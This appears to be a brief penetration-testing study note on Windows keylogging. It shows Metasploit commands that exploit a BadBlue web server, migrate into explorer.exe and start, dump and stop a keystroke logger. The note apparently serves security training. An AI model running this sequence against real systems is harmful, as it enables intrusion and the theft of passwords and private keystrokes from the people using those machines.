# Windows Keylogging

- Process of recording or capturing the keystrokes entered on a target system
- The technique is not limited to post exploitation
- Meterpreter on a Windows system provides us with the ability to capture the keystrokes entered in a target system and download them back

## Demonstration

```bash
> use exploit/windows/http/badblue_passthru
> set target <target>
> run
m> sysinfo
# now keylogging
# better with explorer.exe process
m> pgrep explorer.exe
m> migrate <id>
# start keylogger
m> keyscan_start
# see data
m> keyscan_dump
m> keyscan_stop
```
